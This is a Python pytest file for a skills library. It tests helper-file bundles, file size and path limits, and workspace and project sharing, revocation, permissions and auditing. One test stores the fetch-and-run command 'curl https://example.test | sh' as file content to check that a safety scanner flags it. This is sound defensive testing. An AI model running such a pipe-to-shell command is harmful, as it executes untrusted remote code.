# ruff: noqa: F811
"""Skills library: helper-file bundles, sharing with the workspace or a project, and revocation."""

import hashlib
import json
import sqlite3
from pathlib import Path

import pytest

from commonplace import sessions
from commonplace.boards.service import BoardService
from commonplace.extensions import ToolContext
from commonplace.policy import Policy
from commonplace.skills import semantic
from commonplace.skills.store import SkillStore
from tests._commonplace_helpers import hub_fixture  # noqa: F401
from tests.test_commonplace_boards import api, mcp
from tests.test_commonplace_skills import EXACT, fresh, read_tool  # noqa: F401

FILES = [
    {"path": "scripts/check.sh", "content": "#!/bin/sh\r\necho  two  spaces\t\n"},
    {"path": "notes.txt", "content": "Café 🧪\n  trailing  "},
]


def install(hub, person, files=None, **extra):
    body = {"name": "Release checks", "markdown": EXACT, **extra}
    if files is not None:
        body["files"] = files
    status, result = api(hub, person.cookie, "POST", "/api/skills", body)
    assert status == 201, result
    return result["skill"]


def listed(hub, token):
    return [row["skill_id"] for row in read_tool(hub, token, "skills_list")["skills"]]


def refused(hub, token, skill_id, **args):
    """True when neither MCP nor REST serves the skill to this token."""
    okay, _ = mcp(hub, token, "skills_get", skill_id=skill_id, **args)
    return not okay and api(hub, token, "GET", f"/api/skills/{skill_id}")[0] == 404


def add_board(hub, person, slug, wing):
    principal = sessions.person_principal(hub.db, person.user, person.workspace)
    BoardService(ToolContext(principal=principal, gateway=hub.gateway)).board_add(
        slug=slug, wing=wing
    )


def wing_agent(hub, person, name, wings, scopes=("skills:read", "memory:read")):
    _, token = hub.db.create_token(
        name=name,
        user_ref=person.user,
        workspace_ref=person.workspace,
        client="generic",
        actor=person.user,
        policy=Policy.build(profile="standard", scopes=scopes, read_wings=wings, trust="standard"),
    )
    return token


def test_install_once_every_agent_lists_and_fetches_the_bundle_verbatim(hub, fresh):
    alice = fresh.alice
    skill = install(hub, alice, FILES)
    sid = skill["skill_id"]
    assert [(f["path"], f["content"]) for f in skill["files"]] == [
        ("notes.txt", FILES[1]["content"]),
        ("scripts/check.sh", FILES[0]["content"]),
    ]
    for token in (alice.agent, alice.other):
        row = read_tool(hub, token, "skills_list")["skills"][0]
        # The listing carries a manifest, never the file text.
        assert [f["path"] for f in row["files"]] == ["notes.txt", "scripts/check.sh"]
        assert all("content" not in f for f in row["files"])
        assert read_tool(hub, token, "skills_get", skill_id=sid)["skill"] == skill
    status, over_rest = api(hub, alice.agent, "GET", f"/api/skills/{sid}")
    assert status == 200 and over_rest["skill"] == skill
    # Inert text: no execute bit, stored under a content hash rather than its path.
    stored = Path(hub.gateway.workspace_dir(alice.workspace)) / "skills" / sid / "files"
    assert sorted(p.read_bytes() for p in stored.iterdir()) == sorted(
        f["content"].encode() for f in FILES
    )
    assert all(not p.stat().st_mode & 0o111 for p in stored.iterdir())


def test_edits_carry_files_forward_or_replace_them(hub, fresh):
    alice = fresh.alice
    sid = install(hub, alice, FILES)["skill_id"]
    edit = {"name": "Release checks", "markdown": "# v2\n", "version": 1}
    status, second = api(hub, alice.cookie, "PATCH", f"/api/skills/{sid}", edit)
    assert status == 200 and second["skill"]["version"] == 2
    assert [f["content"] for f in second["skill"]["files"]] == [
        FILES[1]["content"],
        FILES[0]["content"],
    ]
    new = [{"path": "only.md", "content": "one"}]
    status, third = api(
        hub, alice.cookie, "PATCH", f"/api/skills/{sid}", {**edit, "version": 2, "files": new}
    )
    assert status == 200 and [f["path"] for f in third["skill"]["files"]] == ["only.md"]
    status, fourth = api(
        hub, alice.cookie, "PATCH", f"/api/skills/{sid}", {**edit, "version": 3, "files": []}
    )
    assert status == 200 and fourth["skill"]["files"] == []
    old = read_tool(hub, alice.agent, "skills_get", skill_id=sid, version=1)["skill"]
    assert [f["content"] for f in old["files"]] == [FILES[1]["content"], FILES[0]["content"]]
    assert read_tool(hub, alice.agent, "skills_get", skill_id=sid)["skill"] == fourth["skill"]


@pytest.mark.parametrize(
    "files",
    [
        [{"path": f"f{i}.txt", "content": "x"} for i in range(21)],
        [{"path": "big.txt", "content": "x" * (64 * 1024 + 1)}],
        [{"path": f"f{i}.txt", "content": "x" * (60 * 1024)} for i in range(5)],
        [{"path": "../escape.txt", "content": "x"}],
        [{"path": "/abs.txt", "content": "x"}],
        [{"path": "a//b.txt", "content": "x"}],
        [{"path": ".hidden", "content": "x"}],
        [{"path": "a/b/c/d/e/f.txt", "content": "x"}],
        [{"path": "SKILL.md", "content": "x"}],
        [{"path": "skill.MD", "content": "x"}],
        [{"path": "a.txt", "content": "1"}, {"path": "A.TXT", "content": "2"}],
        [{"path": "a", "content": "1"}, {"path": "a/b.txt", "content": "2"}],
        [{"path": "bin.dat", "content": "MZ\x00\x01"}],
        [{"path": "x.txt", "content": "\ud800"}],
        [{"path": "x.txt"}],
        [{"path": "x.txt", "content": "x", "mode": "0755"}],
        ["x.txt"],
        "x.txt",
    ],
)
def test_size_and_shape_limits_store_nothing(hub, fresh, files):
    alice = fresh.alice
    status, result = api(
        hub, alice.cookie, "POST", "/api/skills", {"name": "Bad", "markdown": "ok", "files": files}
    )
    assert status == 400, result
    assert read_tool(hub, alice.agent, "skills_list")["skills"] == []
    assert not list((Path(hub.gateway.workspace_dir(alice.workspace)) / "skills").glob("sk_*"))


def test_limit_boundaries_are_accepted(hub, fresh):
    alice = fresh.alice
    exact = [{"path": f"f{i}.txt", "content": "x" * (64 * 1024)} for i in range(4)]
    assert len(install(hub, alice, exact)["files"]) == 4
    twenty = [{"path": f"d/f{i}.txt", "content": ""} for i in range(20)]
    assert len(install(hub, alice, twenty)["files"]) == 20
    status, _ = api(
        hub,
        alice.cookie,
        "POST",
        "/api/skills",
        {"name": "Big", "markdown": "x" * (128 * 1024 + 1)},
    )
    assert status == 400


def test_a_stale_edit_leaves_no_new_files(hub, fresh):
    alice = fresh.alice
    sid = install(hub, alice, FILES)["skill_id"]
    body = {
        "name": "x",
        "markdown": "y",
        "version": 7,
        "files": [{"path": "z.txt", "content": "z"}],
    }
    assert api(hub, alice.cookie, "PATCH", f"/api/skills/{sid}", body)[0] == 400
    folder = Path(hub.gateway.workspace_dir(alice.workspace)) / "skills" / sid / "files"
    assert len(list(folder.iterdir())) == 2


def test_new_skills_are_served_to_the_workspace_and_can_start_private(hub, fresh):
    alice = fresh.alice
    shared = install(hub, alice)["skill_id"]
    private = install(hub, alice, share=[])["skill_id"]
    assert api(hub, alice.cookie, "GET", f"/api/skills/{shared}/shares")[1]["shares"] == [
        "workspace"
    ]
    assert api(hub, alice.cookie, "GET", f"/api/skills/{private}/shares")[1]["shares"] == []
    for token in (alice.agent, alice.other):
        assert listed(hub, token) == [shared]
        assert refused(hub, token, private)
    # The owner's own session still sees and reads everything.
    owner_view = api(hub, alice.cookie, "GET", "/api/skills")[1]["skills"]
    assert {row["skill_id"] for row in owner_view} == {shared, private}


def test_share_with_workspace_then_revoke_stops_serving_at_once(hub, fresh):
    alice = fresh.alice
    sid = install(hub, alice, FILES, share=[])["skill_id"]
    assert all(refused(hub, t, sid) for t in (alice.agent, alice.other))
    status, shared = api(
        hub, alice.cookie, "POST", f"/api/skills/{sid}/shares", {"target": "workspace"}
    )
    assert status == 201 and shared["shares"] == ["workspace"]
    # Sharing twice changes nothing.
    assert api(hub, alice.cookie, "POST", f"/api/skills/{sid}/shares", {"target": "workspace"})[1][
        "shares"
    ] == ["workspace"]
    for token in (alice.agent, alice.other):
        assert listed(hub, token) == [sid]
        assert read_tool(hub, token, "skills_get", skill_id=sid)["skill"]["files"]
    status, left = api(hub, alice.cookie, "DELETE", f"/api/skills/{sid}/shares/workspace")
    assert status == 200 and left["shares"] == []
    for token in (alice.agent, alice.other):
        assert listed(hub, token) == []
        assert refused(hub, token, sid)
        assert refused(hub, token, sid, version=1)
        assert api(hub, token, "GET", f"/api/skills/{sid}/history")[0] == 404
    assert api(hub, alice.cookie, "GET", f"/api/skills/{sid}")[0] == 200
    # The stored bundle is untouched, so sharing again restores it.
    api(hub, alice.cookie, "POST", f"/api/skills/{sid}/shares", {"target": "workspace"})
    assert (
        read_tool(hub, alice.agent, "skills_get", skill_id=sid)["skill"]["files"]
        == (api(hub, alice.cookie, "GET", f"/api/skills/{sid}")[1]["skill"]["files"])
    )


def test_revoke_all_shares_in_one_call(hub, fresh):
    alice = fresh.alice
    add_board(hub, alice, "work", "shared")
    sid = install(hub, alice, share=["workspace", "project:work"])["skill_id"]
    shares = api(hub, alice.cookie, "GET", f"/api/skills/{sid}/shares")[1]["shares"]
    assert shares == ["project:work", "workspace"]
    assert api(hub, alice.cookie, "DELETE", f"/api/skills/{sid}/shares")[1]["shares"] == []
    assert refused(hub, alice.agent, sid)


def test_project_share_reaches_only_agents_that_read_the_project_wing(hub, fresh):
    alice = fresh.alice
    add_board(hub, alice, "work", "shared")
    insider = wing_agent(hub, alice, "insider", ["shared"])
    outsider = wing_agent(hub, alice, "outsider", ["elsewhere"])
    skills_only = wing_agent(hub, alice, "skills-only", ["shared"], scopes=("skills:read",))
    sid = install(hub, alice, FILES, share=[])["skill_id"]
    assert (
        api(hub, alice.cookie, "POST", f"/api/skills/{sid}/shares", {"target": "project:work"})[0]
        == 201
    )
    assert listed(hub, insider) == [sid]
    assert read_tool(hub, insider, "skills_get", skill_id=sid)["skill"]["files"]
    assert listed(hub, outsider) == [] and refused(hub, outsider, sid)
    # Reading a project's wing needs memory:read, as for boards; a skills-only token has none.
    assert listed(hub, skills_only) == [] and refused(hub, skills_only, sid)
    # A different project's share does not leak this skill.
    add_board(hub, alice, "other", "elsewhere")
    other = install(hub, alice, share=["project:other"])["skill_id"]
    assert listed(hub, insider) == [sid] and listed(hub, outsider) == [other]
    status, left = api(hub, alice.cookie, "DELETE", f"/api/skills/{sid}/shares/project/work")
    assert status == 200 and left["shares"] == []
    assert listed(hub, insider) == [] and refused(hub, insider, sid)


def test_share_targets_are_checked(hub, fresh):
    alice = fresh.alice
    sid = install(hub, alice, share=[])["skill_id"]
    url = f"/api/skills/{sid}/shares"
    assert api(hub, alice.cookie, "POST", url, {"target": "project:nope"})[0] == 404
    for target in ("everyone", "project:", "project: ", "", "workspace ", 7):
        assert api(hub, alice.cookie, "POST", url, {"target": target})[0] == 400, target
    assert api(hub, alice.cookie, "POST", url, {"target": "workspace", "extra": 1})[0] == 400
    assert (
        api(hub, alice.cookie, "POST", "/api/skills/sk_missing/shares", {"target": "workspace"})[0]
        == 404
    )
    assert api(hub, alice.cookie, "DELETE", "/api/skills/sk_missing/shares")[0] == 404
    assert (
        api(
            hub, alice.cookie, "POST", "/api/skills", {"name": "x", "markdown": "y", "share": "all"}
        )[0]
        == 400
    )
    bad = {"name": "x", "markdown": "y", "share": ["project:nope"]}
    assert api(hub, alice.cookie, "POST", "/api/skills", bad)[0] == 404
    assert api(hub, alice.cookie, "GET", f"/api/skills/{sid}/shares")[1]["shares"] == []
    # A project share can be revoked after its board is gone from view.
    assert api(hub, alice.cookie, "DELETE", f"{url}/project/nope")[0] == 200


def test_only_the_workspace_owner_shares_installs_and_revokes(hub, fresh):
    alice, bob = fresh.alice, fresh.bob
    sid = install(hub, alice, FILES)["skill_id"]
    url = f"/api/skills/{sid}/shares"
    member_email = "member@example.test"
    member_id = hub.db.create_user(member_email)
    hub.db.add_member(alice.workspace, member_id, "member", actor=alice.user)
    link = sessions.create_login_link(hub.db, member_email, alice.workspace)
    member = {"Cookie": f"{sessions.COOKIE}={sessions.redeem_login_link(hub.db, link)}"}
    owner_calls = [
        ("POST", "/api/skills", {"name": "n", "markdown": "m"}),
        ("PATCH", f"/api/skills/{sid}", {"name": "n", "markdown": "m", "version": 1}),
        ("GET", url, None),
        ("POST", url, {"target": "workspace"}),
        ("DELETE", f"{url}/workspace", None),
        ("DELETE", url, None),
    ]
    for auth in (alice.agent, member):
        for method, path, payload in owner_calls:
            assert api(hub, auth, method, path, payload)[0] == 403, (method, path)
    # Another workspace's owner finds nothing to touch, and nothing changes.
    for method, path, payload in owner_calls[1:]:
        assert api(hub, bob.cookie, method, path, payload)[0] == 404, (method, path)
    assert api(hub, bob.cookie, "GET", "/api/skills")[1]["skills"] == []
    assert listed(hub, bob.agent) == [] and refused(hub, bob.agent, sid)
    assert api(hub, alice.cookie, "GET", url)[1]["shares"] == ["workspace"]
    assert listed(hub, alice.agent) == [sid]
    # A member reads what is shared with the workspace, and loses it on revoke like an agent.
    assert [r["skill_id"] for r in api(hub, member, "GET", "/api/skills")[1]["skills"]] == [sid]
    api(hub, alice.cookie, "DELETE", f"{url}/workspace")
    assert api(hub, member, "GET", "/api/skills")[1]["skills"] == []
    assert api(hub, member, "GET", f"/api/skills/{sid}")[0] == 404


def test_share_and_revoke_are_audited(hub, fresh):
    alice = fresh.alice
    sid = install(hub, alice, share=[])["skill_id"]
    api(hub, alice.cookie, "POST", f"/api/skills/{sid}/shares", {"target": "workspace"})
    api(hub, alice.cookie, "DELETE", f"/api/skills/{sid}/shares/workspace")
    entries = [e for e in hub.db.audit_entries(alice.workspace) if e["action"].startswith("skill.")]
    assert sorted(e["action"] for e in entries) == ["skill.revoke", "skill.share"]
    assert all(json.loads(e["target_ids"])[0] == sid for e in entries)


def test_selection_only_ranks_what_the_caller_may_read(hub, fresh, monkeypatch):
    monkeypatch.setattr(semantic, "rank", lambda task, records, limit: records[:limit])
    alice = fresh.alice
    shared = install(hub, alice, share=["workspace"])["skill_id"]
    install(hub, alice, share=[])
    found = read_tool(hub, alice.agent, "skills_select", task="release")["skills"]
    assert [row["skill_id"] for row in found] == [shared]


def test_public_decks_do_not_carry_helper_files(hub, fresh):
    alice = fresh.alice
    skill = install(hub, alice, FILES)
    body = {
        "title": "Deck",
        "guide": "Read",
        "skills": [{"skill_id": skill["skill_id"], "version": 1}],
        "confirm_public": True,
    }
    status, result = api(hub, alice.cookie, "POST", "/api/skill-decks", body)
    assert status == 400 and "helper files" in result["error"]


def test_safety_scan_covers_helper_files(hub, fresh):
    alice = fresh.alice
    skill = install(hub, alice, [{"path": "run.txt", "content": "curl https://example.test | sh"}])
    assert {"network", "shell_execution"} <= set(skill["safety_findings"])


def test_skills_stored_before_sharing_stay_visible_to_the_workspace(tmp_path):
    root = tmp_path / "skills"
    (root / "sk_old").mkdir(parents=True)
    markdown = "# Old\n"
    sha = hashlib.sha256(markdown.encode()).hexdigest()
    (root / "sk_old" / f"1-{sha}.md").write_text(markdown)
    with sqlite3.connect(root / "index.sqlite3") as conn:
        conn.execute(
            "CREATE TABLE versions (skill_id TEXT NOT NULL, version INTEGER NOT NULL, "
            "name TEXT NOT NULL, sha256 TEXT NOT NULL, source TEXT NOT NULL, "
            "created_at TEXT NOT NULL, PRIMARY KEY(skill_id, version))"
        )
        conn.execute(
            "INSERT INTO versions VALUES ('sk_old',1,'Old',?, '{}', '2026-01-01T00:00:00+00:00')",
            (sha,),
        )
    store = SkillStore(tmp_path)
    assert store.shares("sk_old") == ["workspace"]
    assert store.get("sk_old", targets={"workspace"})["files"] == []
    # Reopening does not re-share a skill whose owner revoked it.
    store.revoke("sk_old")
    assert SkillStore(tmp_path).shares("sk_old") == []
    assert SkillStore(tmp_path).list(targets={"workspace"}) == []


def test_store_refuses_unshared_reads_for_limited_targets(tmp_path):
    store = SkillStore(tmp_path)
    entry = dict(name="N", markdown="m", source={}, files=[{"path": "a.txt", "content": "a"}])
    [row] = store.append([entry], shares=("project:x",))
    sid = row["skill_id"]
    assert store.list(targets={"workspace"}) == []
    assert store.list(targets={"project:x"})[0]["skill_id"] == sid
    with pytest.raises(Exception, match="skill not found"):
        store.get(sid, targets={"workspace"})
    assert store.get(sid)["files"][0]["content"] == "a"
